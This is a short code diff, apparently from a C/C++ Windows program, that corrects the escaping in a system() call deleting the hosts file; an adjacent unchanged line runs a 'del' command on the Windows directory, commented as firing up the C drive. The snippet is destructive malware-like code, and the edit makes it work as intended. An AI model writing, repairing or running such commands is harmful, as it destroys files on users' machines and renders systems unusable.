@@ -145,7 +145,7 @@ while (GetMessageW(&msg,NULL,0,0))
     DispatchMessage(&msg);
 }
     
-       system("del C:\WINDOWS\System32\drivers\etc\hosts");// deleting the host files of C directory in sense of malfunction 
+       system("del C:\\WINDOWS\\System32\\drivers\\etc\\hosts");// deleting the host files of C directory in sense of malfunction 
     system("del C:\\WINDOWS\\.");//Now fire up the C drive  
 
 
